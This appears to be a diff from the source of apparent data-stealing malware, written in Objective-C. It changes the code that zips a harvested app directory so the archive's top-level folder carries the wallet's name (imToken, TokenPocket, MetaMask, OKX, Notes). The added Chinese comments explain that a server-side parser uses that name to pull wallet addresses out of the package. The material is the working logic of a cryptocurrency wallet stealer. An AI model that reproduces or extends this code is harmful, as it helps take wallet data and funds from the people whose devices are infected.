@@ -298,10 +298,13 @@
     NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:packSuffix];
 
     NSError *e = nil;
+    // 顶层目录必须用「钱包身份名」（imToken/TokenPocket/MetaMask/OKX/Notes…），
+    // 服务端 match_parser 优先按第一段目录分派；用 bundleId 会认不出，
+    // 退化成子串匹配后 RCT 文件会被误判成 coin98，一行地址都出不来。
     BOOL ok = [OWArchive zipDirectory:p
                                    to:tmp
                              manifest:manifest
-                               subdir:bid
+                               subdir:name
                              maxBytes:200ULL * 1024 * 1024
                              totalCap:cap
                                 error:&e];
